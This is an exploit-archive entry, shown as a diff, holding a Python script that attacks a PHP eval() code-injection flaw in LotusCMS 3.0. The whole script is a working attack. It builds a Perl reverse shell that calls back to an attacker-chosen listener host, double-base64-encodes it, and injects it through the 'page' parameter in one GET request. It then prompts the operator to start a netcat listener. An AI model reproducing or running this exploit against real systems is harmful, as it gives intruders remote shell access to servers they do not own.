@@ -1,0 +1,74 @@
+id: 20944
+date: 06/26/2013
+title: LotusCMS 3.0 PHP Code Execution
+author: infodox
+cves: 
+
+#!/usr/bin/python
+# Script that spawns a reverse shell (python)
+# on vulnerable LotusCMS 3.0 installations.
+# Uses a simple PHP eval() vulnerability.
+# http://secunia.com/secunia_research/2011-21/
+# infodox - Insecurety Research (2013)
+# insecurety.net - @info_dox
+import requests
+import random
+import threading
+import sys
+
+# Add in the payload generating functions here, add Perl later...
+# Add in the payload generating functions here
+def genpayload(host, port):
+    """ Perl Reverse Shell Generator """
+    load = """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};';""" %(host, port)
+    encoded = load.encode('base64')
+    encoded = encoded.strip()
+    encoded = encoded.replace('\n', '')
+    encoded = encoded.encode('base64')
+    encoded = encoded.strip()
+    encoded = encoded.replace('\n', '') # double encoding , yes
+    payload = "system(base64_decode(base64_decode('%s')))" %(encoded)
+    return payload
+
+def hack(pwn):
+    requests.get(pwn)
+
+def main():
+    haxurl = "http://" + target + path + "index.php?page=index%27%29%3B%24{INSERTCODE}%3B%23"
+    payload = genpayload(host, port)
+    pwn = haxurl.replace("INSERTCODE", payload)
+    print "[+] Preparing for hax"
+    print "[!] Please run nc -lvp %s on your listener" %(port)
+    raw_input("Press Enter to Fire...") # debugging
+    print "[*] Sending malicious request..."
+    threading.Thread(target=hack, args=(pwn,)).start() # ph33r l33t thr34d1ng
+    print "[?] g0tr00t?"
+    sys.exit(0)
+
+def randomQuote():
+    quotes =\
+    ['Now with advice from Sabu!', 'Now with LOIC Support', 'Now with auto-DDoS',
+    'Now with auto-brag!', 'Now with advice from Kevin Mitnick', 'Now with added dongles!',
+    'Comes with free forkbombs!', 'Now with a free copy of Havij', 'Are you stoned, or just stupid?']
+    randomQuote = random.choice(quotes)
+    return randomQuote
+
+def banner():
+    print "LotusCMS 3.0 Eval() Remote Code Execution Exploit."
+    randomquote = randomQuote()
+    print randomquote
+
+if len(sys.argv) != 5:
+    banner()
+    print "Usage: %s <target host> <path to lcms> <listener host> <listener port>" %(sys.argv[0])
+    print "Example: %s hackme.com /lcms/ hacke.rs 1337" %(sys.argv[0])
+    sys.exit(1)
+else:
+    banner()
+    target = sys.argv[1]
+    path = sys.argv[2]
+    host = sys.argv[3]
+    port = sys.argv[4]
+    main()
+
+#  0day.today [2023-03-22]  #
